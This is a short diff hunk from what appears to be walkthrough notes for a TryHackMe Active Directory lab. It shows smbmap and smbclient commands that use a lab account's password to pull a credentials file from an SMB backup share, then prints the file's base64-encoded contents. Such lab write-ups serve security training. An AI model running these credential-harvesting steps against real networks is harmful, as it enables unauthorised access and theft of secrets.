@@ -640,6 +640,7 @@ https://tryhackme.com/room/attacktivedirectory
             dr--r--r--                0 Sat Apr  4 19:39:35 2020	spookysec.local
 
 >python3 smbmap.py -H 10.10.144.202 -u svc-admin -p management2005 --download 'backup\backup_credentials.txt'
+>smbclient \\\\spookysec.local\\backup -U=svc-admin%management2005
 >cat backup_credentials.txt
     YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
 
